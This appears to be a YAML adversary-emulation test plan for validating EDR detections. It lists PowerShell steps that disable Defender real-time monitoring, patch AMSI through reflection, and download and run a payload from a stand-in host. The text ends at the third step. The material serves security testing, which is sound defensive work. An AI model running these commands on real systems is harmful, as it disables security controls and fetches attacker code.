steps:
- id: step-01
  name: Disable Defender Real-Time Monitoring
  command: powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
  identity: direct
  mitre_technique: T1562.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Defender Tampering via PowerShell
    ttp_ref: TTP-0000-0008
    detection_id: bioc-defender-tampering-via-powershell
- id: step-02
  name: Patch AMSI in Memory
  command: powershell.exe -WindowStyle Hidden -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation');
    [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true"
  identity: direct
  mitre_technique: T1562.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: AMSI Memory Patching via Reflection
    ttp_ref: TTP-0000-0008
    detection_id: bioc-amsi-memory-patching-via-reflection
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Download and Execute Payload
  command: powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.5/payload.ps1')"
